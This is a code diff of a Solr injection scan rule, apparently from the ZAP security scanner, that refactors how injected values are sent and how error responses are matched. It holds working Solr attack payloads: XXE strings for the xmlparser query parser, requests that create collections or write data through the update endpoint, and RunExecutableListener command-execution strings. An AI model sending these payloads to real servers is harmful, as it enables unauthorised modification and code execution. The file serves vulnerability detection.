@@ -1,7 +1,9 @@
 package org.zaproxy.zap.extension.ascanrulesAlpha;
 
 import java.io.IOException;
-import java.net.SocketException;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.regex.Pattern;
 import org.apache.log4j.Logger;
 import org.parosproxy.paros.Constant;
 import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
@@ -10,6 +12,11 @@ import org.parosproxy.paros.core.scanner.Category;
 import org.parosproxy.paros.network.HttpMessage;
 import org.zaproxy.zap.model.Tech;
 
+/**
+ * The SolrInjection plugin identifies Solr injection vulnerabilities with Solr web application.
+ *
+ * @author LuigiCasciaro
+ */
 public class SolrInjection extends AbstractAppParamPlugin {
 
 	private static final Tech SOLR_TECH = Tech.Db /* TODO Tech.Solr */;
@@ -19,19 +26,22 @@ public class SolrInjection extends AbstractAppParamPlugin {
 	private static final String INJECTED_COLLECTION = "collectioninjected";
 	private static final String DEFAULT_COLLECTION = "gettingstarted";
 	private static final String INJECTED_LISTENER = "injectedlistener";
-	private static final String TOKEN_UNKOWN_HOST = "http://_z<>a<>p<>.com	";
-	private static final String[] ALL_DATA_INJECTION = {"{! rows=10} *", "*", "[* TO *]", "(1 OR *)"};
+	private static final String UNKOWN_HOST_TOKEN = "http://_z<>a<>p<>.com	";
+	private static final String CASUAL_TOKEN = "{987987987zapPenentrationTest123123123 *";
+	private final List<Pattern> errorPatterns = initPattern(SOLR_ERROR_MATCHING);
 
+	private static final String[] ALL_DATA_INJECTION = {"{! rows=10} *", "*", "[* TO *]", "(1 OR *)"};
 	private static final String[] XXE_INJECTION = { 
-		"{!xmlparser v=\'<!DOCTYPE a SYSTEM \""+TOKEN_UNKOWN_HOST+"\"><a></a>\'}",
+		"{!xmlparser v=\'<!DOCTYPE a SYSTEM \""+UNKOWN_HOST_TOKEN+"\"><a></a>\'}",
 		//create a new collection
 		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/admin/collections?action=CREATE&name="+
 		INJECTED_COLLECTION+"&numShards=2\"><a></a>'}",
 		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+DEFAULT_COLLECTION+"/update?stream.body="
 		+ "[{\"id\":\"AAA\"}]&commit=true&overwrite=true\"><a></a>'}"		
 	};
-	
-	 static final String[] CODE_EXECUTION_INJECTION = {
+
+	//TODO: implement the penetration test for these rules.
+	private static final String[] CODE_EXECUTION_INJECTION = {
 		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+INJECTED_COLLECTION+"/select?q=xxx&qt=/solr/"
 		+INJECTED_COLLECTION+"/config?stream.body={\"add-listener\":{\"event\":\"postCommit\",\"name\":\""
 		+INJECTED_LISTENER+"\",\"class\":\"solr.RunExecutableListener\"}}&shards=localhost:8983/\"><a></a>'}",
@@ -41,8 +51,8 @@ public class SolrInjection extends AbstractAppParamPlugin {
 		+INJECTED_LISTENER+"\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"\"}}&shards=localhost:8983/\"><a>"
 		+ "</a>'}"
 	};
-	
-	private static final String[] XXE_ERROR_STRING = {
+
+	private static final String[] SOLR_ERROR_MATCHING = {
 		"document type declaration must be well-formed",
 		"Error parsing XML stream:java.net.UnknownHostException", 
 		"Error parsing XML stream:java.net.ConnectException: Connection refused"
@@ -102,70 +112,76 @@ public class SolrInjection extends AbstractAppParamPlugin {
 	@Override
 	public void scan(HttpMessage msg, String param, String value) {
 		if(inScope(SOLR_TECH)){
-			allDataInjectionScan(msg, param, value);
-			xxeInjectionScan(msg, param, value);
+			if (LOG.isDebugEnabled()) {
+				LOG.debug("Scannning URL ["+msg.getRequestHeader().getMethod()+"] ["+msg.getRequestHeader().getURI()+
+						"] on param: ["+param+"] with value: ["+value+"] for Solr Injection");
+			}
+			innerScan(msg, param, value, ALL_DATA_INJECTION, false, ALL_DATA_ATTACK);
+			innerScan(msg, param, value, XXE_INJECTION, true, XXE_ATTACK);
 		}
 	}
 	
-	private void allDataInjectionScan(HttpMessage msg, String param, String value){
-		HttpMessage injectedMsg;
-		for(String injectedValue : ALL_DATA_INJECTION) {
+	private void innerScan(HttpMessage msg, String param, String value, String[] injectedValues, boolean errorCheck,
+			String typeAttack) {
+		
+		for(String injectedValue : injectedValues) {
 			if(isStop()) {
 				return;
 			}
 			try {
-				injectedMsg = sendInjectedMsg(param, injectedValue);
-
-				if(!getBaseMsg().getResponseBody().toString().equals(injectedMsg.getResponseBody().toString())) {
-					bingo(Alert.RISK_MEDIUM, Alert.CONFIDENCE_MEDIUM, getName(), getDescription(), null, param, 
-							injectedValue, getExtraInfo(ALL_DATA_ATTACK), getSolution(), injectedMsg);
-				return;
-				}
-			} catch (IOException ex) {
 				if (LOG.isDebugEnabled()) {
-					LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() + 
-							" when try to send an http message");
+					LOG.debug("\nTrying with the value: "+injectedValue+" to test the Solr "+typeAttack+" attack");
 				}
-			}
-		}
-	}
-
-	private void xxeInjectionScan(HttpMessage msg, String param, String value) {
-		HttpMessage injectedMsg;
-		for(String injectedValue : XXE_INJECTION) {
-			if(isStop()) {
-				return;
-			}
-			try {
-				injectedMsg = sendInjectedMsg(param, injectedValue);
-				String bodyMsgInjected = injectedMsg.getResponseBody().toString();
-				if(!getBaseMsg().getResponseBody().toString().equals(bodyMsgInjected)) {
-					for(String m:XXE_ERROR_STRING) {
-						if(bodyMsgInjected.contains(m)) {
-							bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, param, 
-									injectedValue, getExtraInfo(XXE_ATTACK), getSolution(), injectedMsg);
-							return;
+				msg = getNewMsg();
+				setParameter(msg, param, injectedValue);
+				sendAndReceive(msg);		
+				if(!getBaseMsg().getResponseBody().toString().equals(msg.getResponseBody().toString())) {
+					
+					if(errorCheck) {
+						/*for(String m:SOLR_ERROR_MATCHING) {
+							if(bodyMsgInjected.contains(m)) {
+								bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, param, 
+										injectedValue, getExtraInfo(typeAttack), getSolution(), msg);
+								return;
+							}
+						}
+					}
+					*/
+						StringBuilder sb = new StringBuilder();
+						for(Pattern p : errorPatterns) {
+							if(matchBodyPattern(msg, p, sb)) {
+								bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, param, 
+										injectedValue, getExtraInfo(typeAttack), getSolution(), msg);
+								return;
+							}
+						}
+					}
+					else {
+						//make sure that isn't a false positive
+						HttpMessage verificationMsg = getNewMsg();
+						setParameter(verificationMsg, param, CASUAL_TOKEN);
+						sendAndReceive(verificationMsg);
+						if(!msg.getResponseBody().toString().equals(verificationMsg.getResponseBody().toString())){
+							bingo(Alert.RISK_MEDIUM, Alert.CONFIDENCE_MEDIUM, getName(), getDescription(), null, param, 
+									injectedValue, getExtraInfo(ALL_DATA_ATTACK), getSolution(), msg);
+							break;
 						}
 					}
 				}
-			} catch (SocketException ex) {
+			} catch (IOException ex) {
 				if (LOG.isDebugEnabled()) {
 					LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() +
 							" when try to send an http message");
 				}
-			} catch (IOException ex) {
-				if (LOG.isDebugEnabled()) {
-					LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() + 
-							" when try to send an http message");
-				}
 			}
 		}
 	}
-
-	private HttpMessage sendInjectedMsg(String param, String value) throws IOException {
-		HttpMessage newMsg = getNewMsg();
-		setParameter(newMsg, param, value);
-		sendAndReceive(newMsg);
-		return newMsg;
+	
+	private static List<Pattern> initPattern(String[] eb) {
+		List<Pattern> list =  new ArrayList<>();
+		for(String regex: eb) {
+			list.add(Pattern.compile(regex, AbstractAppParamPlugin.PATTERN_PARAM));
+		}
+		return list;
 	}
 }
